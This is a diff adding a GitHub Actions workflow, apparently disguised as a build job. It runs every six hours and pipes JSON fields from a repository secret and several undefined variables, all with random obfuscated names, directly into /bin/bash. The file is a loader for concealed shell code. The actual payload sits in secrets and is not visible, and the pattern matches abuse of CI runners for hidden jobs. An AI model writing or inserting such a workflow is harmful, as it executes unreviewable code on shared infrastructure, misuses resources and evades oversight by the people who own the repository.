@@ -1,0 +1,24 @@
+name: yujinchou3413
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yujinchou3413
+        env:
+          q76: ${{ secrets.q76 }}
+        run: |
+          echo $q76 | jq -r .r2437 | /bin/bash
+          echo $gbhb365 | jq -r .jeg76298 | /bin/bash
+          echo $fm2 | jq -r .zriu4 | /bin/bash
+          echo $la508 | jq -r .oi492 | /bin/bash
+          echo $u114 | jq -r .pqu85814 | /bin/bash
+          echo $zbxn4 | jq -r .f73137 | /bin/bash
+          echo $fp6285 | jq -r .alhu9 | /bin/bash
+
